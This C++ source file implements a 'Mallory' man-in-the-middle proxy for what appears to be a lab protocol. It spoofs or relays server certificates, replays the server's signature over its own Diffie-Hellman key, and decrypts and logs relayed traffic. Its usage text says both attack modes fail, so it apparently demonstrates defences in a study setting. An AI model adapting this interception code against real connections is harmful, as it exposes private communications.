#include <iostream>
#include <string>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <thread>
#include "crypto_utils.h"

using namespace std;

void forward_traffic(int src_sock, int dst_sock, const string& src_name, const string& dst_name, string decrypt_key, string encrypt_key) {
    char buffer[8192];
    string leftover = "";
    while (true) {
        memset(buffer, 0, sizeof(buffer));
        int bytes = recv(src_sock, buffer, sizeof(buffer) - 1, 0);
        if (bytes <= 0) break;
        
        string data = leftover + string(buffer);
        size_t pos = 0;
        while ((pos = data.find("\n")) != string::npos) {
            string enc_line = data.substr(0, pos);
            data.erase(0, pos + 1);
            if (enc_line.empty()) continue;

            // Decrypt with src key
            string dec = decrypt_aes_gcm(enc_line, decrypt_key);
            if (!dec.empty()) {
                if (dec.rfind("LOGIN ", 0) != 0 && dec.find("LOGIN_OK") != 0 && dec.rfind("WHO", 0) != 0) {
                    cout << "[MALLORY INTERCEPT] " << src_name << " -> " << dst_name << ": " << dec << "\n";
                }
                
                // Re-encrypt with dst key
                string re_enc = encrypt_aes_gcm(dec, encrypt_key);
                string packet = re_enc + "\n";
                send(dst_sock, packet.c_str(), packet.length(), 0);
            }
        }
        leftover = data;
    }
}

int main(int argc, char* argv[]) {
    if (argc != 5) {
        cerr << "Usage: " << argv[0] << " <listen_port> <real_server_ip> <real_server_port> <attack_mode>\n";
        cerr << "attack_mode: 1 = Send Fake Cert (Fails CA Validation), 2 = Send Stolen Real Cert (Fails Proof-of-Possession)\n";
        return 1;
    }

    int listen_port = stoi(argv[1]);
    string real_server_ip = argv[2];
    int real_server_port = stoi(argv[3]);
    string attack_mode = argv[4];

    int proxy_fd = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(proxy_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in proxy_addr;
    proxy_addr.sin_family = AF_INET;
    proxy_addr.sin_addr.s_addr = INADDR_ANY;
    proxy_addr.sin_port = htons(listen_port);

    bind(proxy_fd, (struct sockaddr*)&proxy_addr, sizeof(proxy_addr));
    listen(proxy_fd, 5);

    cout << "Mallory MITM Proxy listening on port " << listen_port << "...\n";

    while (true) {
        struct sockaddr_in client_addr;
        socklen_t client_len = sizeof(client_addr);
        int client_fd = accept(proxy_fd, (struct sockaddr*)&client_addr, &client_len);
        
        cout << "Victim connected to Mallory!\n";

        // Connect to Real Server
        int server_fd = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in server_addr;
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(real_server_port);
        inet_pton(AF_INET, real_server_ip.c_str(), &server_addr.sin_addr);
        connect(server_fd, (struct sockaddr*)&server_addr, sizeof(server_addr));

        // Phase 3: Relay Server Certificate to Victim
        // Get Real Server Certificate
        char buffer[8192];
        string cert_data = "";
        while (true) {
            memset(buffer, 0, sizeof(buffer));
            int bytes = recv(server_fd, buffer, sizeof(buffer) - 1, 0);
            if (bytes <= 0) break;
            cert_data += string(buffer);
            if (cert_data.find("EOF_CERT\n") != string::npos) {
                break;
            }
        }
        cout << "[MITM] Intercepted Server Certificate!\n";

        if (attack_mode == "1") {
            cout << "[MITM Attack 1] Sending a completely FAKE self-signed certificate to Victim!\n";
            // Create a fake cert dynamically using openssl (or just send garbage)
            system("openssl req -x509 -newkey rsa:2048 -keyout /tmp/fake.key -out /tmp/fake.crt -days 1 -nodes -subj \"/CN=192.168.1.10\" 2>/dev/null");
            FILE* f = fopen("/tmp/fake.crt", "r");
            string fake_cert_str = "";
            if (f) {
                char buf[1024];
                while(fgets(buf, sizeof(buf), f)) fake_cert_str += buf;
                fclose(f);
            }
            string fake_cert_packet = "CERT\n" + fake_cert_str + "\nEOF_CERT\n";
            send(client_fd, fake_cert_packet.c_str(), fake_cert_packet.length(), 0);
        } else {
            cout << "[MITM Attack 2] Forwarding the STOLEN Real Server Certificate to Victim!\n";
            send(client_fd, cert_data.c_str(), cert_data.length(), 0);
        }

        // 1. Mallory intercepts Client's DH_INIT
        memset(buffer, 0, sizeof(buffer));
        recv(client_fd, buffer, sizeof(buffer)-1, 0);
        string c_init(buffer);
        string client_pub = c_init.substr(8, c_init.find("\n") - 8);

        // 3. Mallory performs DH with Server to steal its signature
        DHKeyExchange dh_server;
        string mallory_pub_for_server = dh_server.get_public_key_hex();
        string m_init = "DH_INIT " + mallory_pub_for_server + "\n";
        send(server_fd, m_init.c_str(), m_init.length(), 0);

        memset(buffer, 0, sizeof(buffer));
        recv(server_fd, buffer, sizeof(buffer)-1, 0);
        string s_ack(buffer);
        size_t space1 = s_ack.find(" ");
        size_t space2 = s_ack.find(" ", space1 + 1);
        size_t newline = s_ack.find("\n");
        string server_pub = s_ack.substr(space1 + 1, space2 - space1 - 1);
        string server_sig = s_ack.substr(space2 + 1, newline - space2 - 1);
        string server_key = dh_server.compute_shared_secret(server_pub);

        // 2. Mallory performs DH with Client and TRIES TO USE STOLEN SIGNATURE
        DHKeyExchange dh_client;
        string mallory_pub_for_client = dh_client.get_public_key_hex();
        string client_key = dh_client.compute_shared_secret(client_pub);
        
        cout << "[MITM] Attempting Proof-of-Possession Bypass!\n";
        cout << "[MITM] Sending Mallory's Fake DH Public Key but attaching the Real Server's Signature...\n";
        string m_ack = "DH_ACK " + mallory_pub_for_client + " " + server_sig + "\n";
        send(client_fd, m_ack.c_str(), m_ack.length(), 0);

        cout << "[MITM] Fake Key with Client: " << client_key << "\n";
        cout << "[MITM] Fake Key with Server: " << server_key << "\n";
        cout << "[MITM] Transparent proxying started!\n";

        thread t1(forward_traffic, client_fd, server_fd, "Client", "Server", client_key, server_key);
        thread t2(forward_traffic, server_fd, client_fd, "Server", "Client", server_key, client_key);
        t1.detach();
        t2.detach();
    }

    return 0;
}

